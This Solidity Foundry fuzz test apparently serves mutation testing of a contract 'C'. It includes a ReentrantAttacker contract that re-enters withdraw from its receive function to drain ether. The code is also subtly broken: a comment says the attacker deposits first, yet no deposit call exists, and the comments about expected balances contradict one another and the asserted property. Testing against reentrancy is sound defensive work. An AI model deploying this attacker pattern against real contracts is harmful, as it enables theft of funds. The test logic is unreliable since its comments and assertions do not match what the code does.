import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }
    function testFuzz_property(uint256 depositAmount, uint256 withdrawAmount) public {
        // bound amounts to avoid overflow in attacker balances
        depositAmount = bound(depositAmount, 1, 100 ether);
        withdrawAmount = bound(withdrawAmount, 1, depositAmount);
        // deploy a reentrant attacker that calls withdraw inside its receive
        ReentrantAttacker attacker = new ReentrantAttacker(c);
        vm.deal(address(attacker), depositAmount);
        // attacker deposits into C and then withdraws, triggering reentrancy
        attacker.attack{value: depositAmount}(withdrawAmount);
        // the reference contract loses extra funds due to reentrant withdraw -> attacker steals additional ether
        // the mutant no-op prevents the reentrant transfer, so contract balance stays higher
        // rule: contract balance is less than depositAmount - withdrawAmount
        // For reference, reentrancy causes repeated withdrawals -> balance drops below depositAmount - withdrawAmount
        // For mutant, no transfer happens on reentrant call -> balance remains >= depositAmount (only initial deposit lost)
        bool invariantHolds = address(c).balance < depositAmount - withdrawAmount;
        assertTrue(invariantHolds);
    }
}

contract ReentrantAttacker {
    C public target;
    uint256 public amountToWithdraw;
    bool public attacking;

    constructor(C _target) {
        target = _target;
    }

    function attack(uint256 _amount) external payable {
        amountToWithdraw = _amount;
        attacking = true;
        // deposit all received ether into target via fallback
        // then trigger first withdraw, which will call this contract's receive back
        target.withdraw(amountToWithdraw);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(target).balance >= amountToWithdraw) {
            target.withdraw(amountToWithdraw);
        }
    }
}

